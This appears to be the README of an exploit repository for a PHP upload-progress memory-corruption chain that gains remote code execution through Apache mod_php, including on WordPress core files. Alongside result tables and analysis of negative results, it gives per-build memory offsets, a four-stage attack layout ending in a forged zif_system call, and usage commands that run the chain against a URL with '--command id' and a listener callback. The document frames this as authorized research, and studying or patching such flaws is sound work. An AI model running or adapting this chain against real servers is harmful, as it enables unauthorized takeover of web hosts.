| OS / package | Debian 13.7 (trixie); `libapache2-mod-php8.4 8.4.24-1~deb13u1`; `apache2 2.4.69-1~deb13u1` |
| SAPI | `mpm_prefork_module` + `php_module` (mod_php); no FPM, no proxy |
| MPM | default `StartServers 5`, `MinSpareServers 5`, `MaxSpareServers 10`, `MaxRequestWorkers 150`, `MaxConnectionsPerChild 0`; no config-level worker pinning, no custom MPM, no `mod_unique_id`, no restart or kill; the pure-HTTP pin uses 149 header-only POST holders |
| php.ini | default package conffile, `dpkg -V` clean: `post_max_size=8M`, `memory_limit=128M`, `display_errors=Off`, `output_buffering=4096`, `expose_php=Off`, `upload_max_filesize=2M` |
| ASLR | `randomize_va_space=2` |
| Endpoint | `/wp-content/index.php`, official core silence file, mode 644; SHA-256 `bd48c24ce4500e60d2524571756787283f0d3fbfa50b116331309c09773f0cd1` |
| Docroot | official WordPress 7.1.3 ZIP with the inactive bundled plugins absent, plus a default `wp-config.php` byte-identical to `wp-config-sample.php`; no uploads, no mu-plugins, no `.htaccess`, no `.user.ini`, no lab endpoints; mounted read-only |
| Integrity | pre/post manifest identical; `docker diff` clean under `/var/www/html`; a read-only `touch` fails; target hash unchanged |

The endpoint is a standalone silence file that loads no `wp-config.php`, plugins
or themes, so these are SAPI/heap results on an official core file, not an
app-level WordPress RCE.

Priming and leak are chunked (`Transfer-Encoding: chunked`, no `Content-Length`);
second priming and write are plain. `post_max_size` is driven by a declared
length: the same body with a declared length returns 200 and logs
`POST Content-Length ... exceeds the limit`, while the chunked leak reaches PHP,
so the INI is not raised.

**Pure-HTTP pin.** The held sockets use no `%P`, `/proc`, gdb, local process
control or fresh-child swap. Default nginx rejects the leak body with 413 and its
buffering re-arms `post_max_size`. Un-pinned multi-worker audits were stochastic
and low-rate; the pooled series used a worker-count observation and is not quoted
as a blind rate.

**Target-written proofs.** Each proof path contains `uid=33(www-data)` and a
marker; the proof-writing child dies with SIGSEGV and the client sees status 0.
No 200/500, OOM or crash is counted as RCE.

**Scope.** Direct Apache mod_php only; default nginx/FPM and MediaWiki are ❌ or
untested. No application LFI or upload, the docroot is never written; `p2s` is a
logging-only `LogFormat`, not part of the exploit path.

### Applications

| App / version | PHP + SAPI | Endpoint / config | Status | Class / qualifier |
|---|---|---|---|---|
| WordPress 7.1.3 | Ubuntu 22.04 Apache 2.4.52 prefork + Sury mod_php 8.0.28 | `/wp-content/index.php` core silence file; default 150-worker pool | ✅ | all default config; target-written `uid`; WordPress not bootstrapped; no plugin; direct mod_php |
| WordPress 7.1.3 | Apache 2.4.69 prefork + mod_php 8.4.24 (Debian 13.7 `8.4.24-1~deb13u1`) | default prefork; `/wp-content/index.php` core file; official docroot, read-only | ✅ | all default config; core silence file; WordPress not bootstrapped; direct mod_php; target-written proofs; pure-HTTP pin; blind and pooled series (the pooled series used a worker-count observation) |
| WordPress 7.1.3 | 8.4.26 official mod_php (ini) | `/wp-content/index.php` core file; default 150-worker pool | ✅ | all default config; engine-level; target-written `uid`; WordPress not bootstrapped; also reproduced on a plain PHP file under the same docroot; `receipts/wordpress-7.1.3-php-8.4.26/proofs/p1_conc_WP713` |
| WordPress 7.1.3 | Apache 2.4.69 prefork + mod_php 8.4.27 | `/wp-content/index.php` core file, read-only | 🚫 | fixed upstream; priming request 200 with no OOM; no leak; write stage unreachable |
| WordPress 7.1.3 | 8.4.26 nginx+mod_php (non-default) | `/index.php` front controller | — | engine-level OOB; no execution claimed; pre-app (WordPress not installed, `mysqli` missing), HTTP 500 |
| WordPress 7.1.3 | 8.4.26 nginx+mod_php (non-default) | `/wp-content/index.php` | — | engine-level OOB; no execution claimed; larger body cap (non-default); repeated OOB |
| WordPress 7.1.3 | 8.4.26 FPM | `/index.php` | ❌ | multipart OOM only |
| WordPress 7.1.3 | 8.5.11 FPM | `/index.php` | ❌ | OOM only |
| WordPress 7.1.3 | 8.3.35 FPM | `/index.php` | ❌ | OOM only; the 8.3.35 mod_php result does not extend to FPM |
| Roundcube 1.7.5 | 8.4.26 FPM | default DB sessions (`session_storage=db`); nginx caps | ❌ | no chain; DB sessions kept separate from the file-session row; `/static.php` allowlisted but still enters PHP; `PHPSESSID` POST ignored; the priming request exits the worker and leaves no session file; no leak; larger caps still no leak |
| Roundcube 1.7.5 | 8.4.26 nginx+FPM | explicit file sessions (`session_storage=php`) | ❌ | app session exists; priming adds an upload-progress key; the `PHPSESSID` variant merges progress and app keys; leak and write stages return normal pages, including a large static asset; no leak, no auth bypass; leak-stage blocker |
| Nextcloud 35.0.2 | 8.4.26 FPM | documented memory stacks | ❌ | no chain; the larger documented stack removes the OOM; the smaller stack exits the worker and leaves no session file; no leak |
| Drupal 11.4.11 | 8.5.10 FPM (local build) | file sessions + `.user.ini` + lowered limits + static worker | ✅ | app-assisted, not all default config; repeated fresh-ASLR chains |
| Drupal 11.4.11 | 8.4.26 FPM | larger memory limit; default DB sessions | ❌ | no chain; priming exits the worker and leaves no session file; no leak |
| Drupal 10.6.20 | 8.4.26 nginx+FPM | native PHP files | ❌ | no `sessions` table; login writes a native session file; priming and second stage exit the worker once nginx admits them; leak and write stages return normal pages; no leak, no auth bypass; leak-stage blocker |
| Drupal 10.6.20 | 8.3.26 nginx+FPM | native PHP files | ❌ | same priming/second-stage worker exits; no leak; leak-stage blocker |
| Drupal 10.6.20 | 8.4.27 nginx+FPM | native PHP files | 🚫 | fixed control: every stage 200; no OOM, no worker exit, no leak; session file intact |
| Joomla 5.4.10 | 8.5.10 FPM (local build) | file sessions + lowered limits + `cleanup=0` | ✅ | app-assisted, not all default config |
| MediaWiki 1.46.2 | 8.4.26 FPM | `/index.php` | ❌ | OOM only |
| MediaWiki 1.46.2 | 8.5.11 FPM | `/index.php` | ❌ | OOM only |
| MediaWiki 1.46.2 | 8.3.35 FPM | `/index.php` | ❌ | OOM only |
| Moodle 5.0.10 | 8.5.11 FPM | normal request | ❌ | fresh serializer at RINIT |

No authentication bypass was observed: a Drupal wrong password returned the login
page with no redirect or cookie, a valid Drupal login survived the full sequence,
and Roundcube rejected wrong logins with and without a valid CSRF token. 8.4.27
returned 200 for all stages with no OOM or worker exit; disabling
`session.upload_progress` on 8.4.26 moved the priming failure to an app-level 500
with the worker alive, but the second stage still exited the worker and no leak
appeared. The app rows show reachability and availability failures, not memory
corruption.

**Drupal 10.6 file-session root cause.**
`Drupal\Core\Session\SessionHandler` extends `AbstractProxy`, which Symfony does
not wrap, so native `files` stays active and the SQLite database has no `sessions`
table; Drupal 11.4.11 extends `AbstractSessionHandler` and uses the DB.

### Body limits

The matrix is complete except one diagnostic case sent to the wrong document root
(excluded); Roundcube on 8.4.27 was untested.

| Stage | Default one-megabyte cap | Mid cap | Large cap |
|---|---|---|---|
| Priming | rejected | worker exits | worker exits (8.4.27: 200) |
| Second priming | worker exits | worker exits | worker exits (8.4.27: 200) |
| Leak | rejected | rejected | normal response |
| Write | normal | normal | normal |

The default cap blocks the priming and leak stages only; the second priming and
write stages fit and still exercise the engine. A mid cap admits everything
except the leak; only the large cap admits all four.

### Other CVEs

| CVE | Builds | Config | Status | Class / result |
|---|---|---|---|---|
| CVE-2026-115560 | 8.4.26 / 8.5.11; mod_php + FPM | `cleanup=0`, app gadget, `php_binary`/`php_serialize` to `php` (non-default) | ✅ | app-gadget RCE; no memory corruption; sanitizer clean |
| CVE-2026-115560 | default `cleanup=1` | default | ❌ | poisoned record deleted before app code |
| CVE-2026-115560 | 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35 | `cleanup=0` (non-default) | ✅ | still reproduces; the 109618/109619 fixes do not address this CVE |
| CVE-2026-6722 | 8.4.20 / 8.5.5; SOAP | mod_php | ❌ | unauthenticated remote DoS, no RCE; handlers call the primitive, no ASLR bypass |
| CVE-2026-6722 | 8.4.21 / 8.5.6 | mod_php | 🚫 | fixed |
| CVE-2019-11043 | 7.1.32 / 7.2.23 / 7.3.10; FPM | nginx with path-info routing (non-default) | ✅ | config-induced RCE |
| CVE-2019-11043 | same | default Debian/WordPress/MediaWiki config | ❌ | blocked |
| CVE-2019-11043 | 7.1.33 / 7.2.24 / 7.3.11; FPM | fixed | 🚫 | fixed |

CVE-2026-115560 is conditional serializer confusion (`php_binary`/`php_serialize`
to `php`, an app gadget, `upload_progress` on, `cleanup=0`). It is not memory
corruption, not an 8.4.27 bypass, and changes no 109618/109619 row. The 🚫 8.4.27,
8.5.12, 8.3.36 and 8.2.35 builds fix only the 109618/109619 memory-corruption
chain.

**Third-party 8.3.35 claim — failed verification.**
`Percivalll/php2shell-wordpress-rce` is a third-party research
repository. Its exact chain was reimplemented on the default
`php:8.3.35-apache` image: no RCE, no marker, no `uid`. Earlier session work
reported a stale-session OOB read with a local priming/leak pair and a
recoverable libphp base, but the claimed chain failed at its priming geometry,
forged header, unvalidated chunk offset and missing controlled base; the
small-leak nginx bypass remains unverified. Repository claim: ❌ tested, not
reproduced. This is separate from the project's own 8.3.35 target-written
proof, which uses the recovered Oct-24 `a1_8234`/`b1_8234` bodies and the
149-holder pin (`receipts/php-8.3.35/`), not the third-party chain.

## Reading the negative results

- **FPM exits 70.** A failed `php_request_startup()` calls
`fcgi_finish_request()`, `php_module_shutdown()` and returns
`FPM_EXIT_SOFTWARE` (70), so the worker and its `ps_globals` are gone before a
second request exists. No FPM cell completes the stale-session-id chain: the
leak-only rows stop after the leak, and the remaining rows never reach the write
stage.
- **Default nginx.** The one-megabyte body cap returns 413 for the priming and
leak bodies; `proxy_request_buffering on` re-frames chunked bodies as
`Content-Length`, which re-arms `post_max_size`; the default response-header
buffer returns 502 on the oversized leak header. The PHP endpoint is not the
blocker.
- **`post_max_size` gate.** A declared length above the limit is rejected before
session code. FPM leak negatives on Debian 11.11/13.7, Rocky 9.3, Amazon
2023.12, Fedora 44 and Alma 9.8 are transport-gated, not valid negatives.
- **1020-part cap.** `Multipart body parts limit exceeded 1020` truncates the
8.4 reference geometry on 7.4/8.0, so prior 7.4/8.0 leak negatives are invalid.
Debian 11 `7.4.33` is a no-primitive result for that geometry, not evidence
that 7.4 is fixed.
- **Fixed versus absent.** 🚫 is a patched build with the basis stated in the
row. 8.4.0 and 8.4.9 were never released, so they have no vulnerable or fixed
cell; they are —, not 🚫.
- **Offsets per build.** `S`, `zif_system`, `zval_ptr_dtor` and `fillers` move
between builds and are never transplanted. Debian-family geometry is
`fillers=116` and `S=main+0xF7398`, against upstream `fillers=115` and
`S=main+0xF8398`.
- **Amplification does not replace the leak.** A small multipart body with many
zero-length nested file parts exhausts memory (500 on mod_php, 502 with a
worker exit on FPM) but allocates array metadata, not the body-value buffers
the leak stage needs. The default front-end caps sit below the leak minimum; no
target-written `uid` exists in that lane.
- **No authentication bypass.** Wrong Drupal and Roundcube logins were rejected,
with and without a CSRF token; a valid Drupal login survived the full sequence.
- **Windows and BSD.** No Windows host and no default-config Windows RCE;
CVE-2024-4577 (Windows CGI BestFit) is patched. FreeBSD 13/14 has no default
8.4.26 with prefork mod_php; the default 8.4.27/8.5.12 builds are fixed. Not
supported, not proven.

## Reproduction

### Layout

| path | contents |
|---|---|
| `tool/php2shell.py` | chain driver (`recon`, `producer`, `write_stage`, `leak`, `g2`, `chain`) |
| `tool/debian8424.py` | standalone Debian 13 `libapache2-mod-php8.4` 8.4.24 four-stage runner (priming, leak, second priming, write); dry by default |
| `tool/phpcheck.py` | passive PHP version/build CVE candidate checker; no exploit traffic |
| `tool/run` | POSIX shell wrapper: `./tool/run --help` |
| `tool/modules/` | request/producer builders, chain stages, per-build profiles (see `tool/modules/README.md`) |
| `tool/stages/` | fingerprint and probe stage |
| `addresses/` | per-build offset profiles loaded by `g2_chain.py` and `leak_stage.py` |
| `README.md` | this document |
| `COVERAGE.md` | full coverage ledger: open items, tested negatives, fixed and absent builds, untested applications |
| `receipts/` | preserved target-written proof tree and verification tool; see [`receipts/README.md`](receipts/README.md) |
| [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md) | third-party code, PoC and shape-note notices (full text) |
| `requirements.txt` | dependency note: standard library only, Python 3.10+ |
| `LICENSE` | AGPL-3.0 license text |

`addresses/g2_fpm_*.json` are runtime inputs for `--step g2` and
`addresses/apache_libphp.json` for `--step leak`; without them those steps cannot
resolve a build. `addresses/apache_libphp_8511.json` records the measured
8.5.11 mod_php offsets and pad geometry as reference data; the leak step still
resolves `addresses/apache_libphp.json`.

Per-build receipt directories are `receipts/php-8.2.34/`,
`receipts/php-8.3.35/`, `receipts/php-8.4.1/` … `receipts/php-8.4.7/` and
`receipts/php-8.4.10/` … `receipts/php-8.4.26/`; the WordPress 7.1.3 proof is
stored at `receipts/wordpress-7.1.3-php-8.4.26/proofs/p1_conc_WP713`.

Receipts are shipped for 8.2.34, 8.3.35, 8.4.1–8.4.7 and 8.4.10–8.4.26. The
7.4.33, 8.0.28/8.0.29/8.0.30 and 8.1.34 mod_php cells, the WordPress 8.0.28 cell
and the Path C cells have no target-written receipt in `receipts/`; those results
rest on the lab records and are not receipt-backed. The 8.2.34/8.3.35
directories also retain the earlier negative rerun evidence, marked superseded.
The repository ships the tool, its offset profiles, the documentation listed
here and the preserved receipts.

### Requirements

- Python 3.10 or newer, standard library only (PEP 604 unions in `php2shell.py`).
- A POSIX shell for `tool/run`.

Nothing to install.

### Usage

```sh
./tool/run --help
./tool/run --target wiki --step recon
./tool/run --target wp --step producer
./tool/run --target modphp --step chain --url http://127.0.0.1/ --command id
./tool/run --step g2 --g2-profile 8.5.10 --g2-decode zif_system --g2-x 0x7f0000000000 --g2-x2 0x7f0000001000 --g2-p 0x7f0000002000 --g2-b0 0x7f0000003000
```

Steps: `recon` (read-only receipt), `producer` (send a payload), `write_stage`
(build the forged multipart, no send), `leak` (mod_php calibration plan), `g2`
(offline FPM record plan), `chain` (mod_php ordered chain; FPM uses blocker-hold,
rearm and forged staged multipart). Constants live in `tool/modules/profiles.py`;
receipts go to `files/io/` and are git-ignored.

### Debian 13 mod_php 8.4.24 runner

`tool/debian8424.py` is a separate runner for the exact package
`libapache2-mod-php8.4 8.4.24-1~deb13u1`; it is not a `--profile` entry and does
not change `--step chain`. It targets prefork mod_php with default
`output_buffering` and a small PHP probe endpoint, and the package must match
because constants are build-specific.

Dry-run is the default; `--live` sends the four-stage sequence and the bodies are
hash-checked before sending. Success is reported only when the marker is seen
through `--callback`/`--callback-log`, `--proof-file` or `--error-log`; an HTTP
200/500 alone is not success. The leak stage is probabilistic and the write-stage
command must fit the carrier.

```sh
python3 -m tool.debian8424 --url http://127.0.0.1:8080/ --dry-run
python3 -m tool.debian8424 --url http://127.0.0.1:8080/ --command id --lhost 127.0.0.1 --lport 9001 --timeout 180 --output files/io/debian8424-run1 --live
```

### Passive version/build checker

`tool/phpcheck.py` maps a PHP version (optionally with a distro package revision)
and SAPI to CVE-2026-109618/109619 candidate status. It sends no exploit
traffic: offline without `--url`, and `--url` performs one unauthenticated GET
and reads response headers only. Requires Python 3.10 or newer.

```sh
python3 tool/phpcheck.py --version 8.4.24 --sapi mod_php
python3 tool/phpcheck.py --package 'libapache2-mod-php8.4=8.4.24-1~deb13u1' --distro debian13 --sapi mod_php --json
python3 tool/phpcheck.py --list-cves
```

`VULNERABLE-CANDIDATE` is a lead, not proof: pass `--package`/`--distro` for
build identity and verify the listed conditions.

## Scope and authorization

Use only against systems you own or are explicitly authorized to test. The tool
sends malformed multipart bodies that can crash or exhaust PHP workers by design.

The chain does not bypass authentication, does not use an application-specific
LFI or upload, and does not write third-party files: the only target-side writes
are the same-chain proof file or the session file. A target-written `uid` is the
proof; an HTTP 200/500, an OOM or a crash is never counted as RCE.

Results are specific to the exact build and configuration in the row. ASLR is on
and `display_errors` is off in every positive mod_php cell. Official images use
`(ini)`; default nginx and default FPM are negative for this chain.

OpenBSD and NetBSD were untested.

## License

AGPL-3.0; see `LICENSE`. The two PHP-UP-2026-derived builders are not relicensed
by AGPL-3.0, and the WoYinDao MIT notice is retained in
`THIRD_PARTY_NOTICES.md`.

## Third-party code and references

The multipart framing and flood arms in the flood producer are taken from
`WoYinDao/CVE-2026-109618-CVSS-9.2-Critical`, `tools/exploit_128m.py`, commit
`a127f77009ca` (snapshot `99da6fb7dd7ecd4a95cd7188d77bb7e7785012eb`), MIT,
Copyright (c) 2026 WoYinDao. They provide the chunked framing and the 128M flood
shapes.

The two staged upload-progress shape builders follow `poc0_109618.py` and
`poc1_109619.py` from the PHP-UP-2026 bundle published by J4ck3LSyN, with
research credit to Andrew Dorman (@acd421) and Arch&Yuki (@ArchKnight23),
<https://jackalsyn.com/posts/php-up-2026.html>, mirror `cereZ23/php-up-2026`
commit `c63f145596dbe9cdd437d24ed2418f0c1e59bcc2`. They provide the staged
priming, leak and write bodies. The bundle's own validation rates its
reproduced chains as memory-safety only, so it is a shape source rather than the
advisory proof of concept, and the CVE-2026-109618/109619 advisories credit their
own reporters. The bundle has no open-source license and is
defensive-research/scoped-engagement only; AGPL-3.0 does not relicense those two
builders.

The two reconstructed shape modules were built from Zer061 / PHP-UP-2026 shape
notes (repository removed; Wayback snapshot in `THIRD_PARTY_NOTICES.md`). They
provide the two upstream body shapes; no verbatim code was used.

The 8.4.24 four-stage layout in the Debian runner follows
`9bie/php2shell-bypass-aslr-exp`. That project is the reference for the stage
layout (A1 OOM, B1 leak, A2 OOM, B2 fake `zend_array` / `zif_system`). The bodies,
geometry and offsets are local measurements; code-level reuse is unresolved and
no license is asserted.

Reviewed but not incorporated: `ACD421/PHP` (the repository itself; the acd421
PoCs are credited above), `offline-ant/php2fix`,
`Percivalll/php2shell-wordpress-rce`, `kengwang/php2shell-fpm-exp`,
`KillaBoi/StealMyBitcoin-PoC` (per-build PHP 8.4.26 cli-server CTF PoC; no
license; no code copied); `php-src` and the security advisories are used as
facts only.

References: GHSA-w8hw-w9fx-j79w, GHSA-6wmf-4rv5-p3rp, <https://calif.io/php2shell/>.

Full upstream files, commits and license terms:
[THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md).
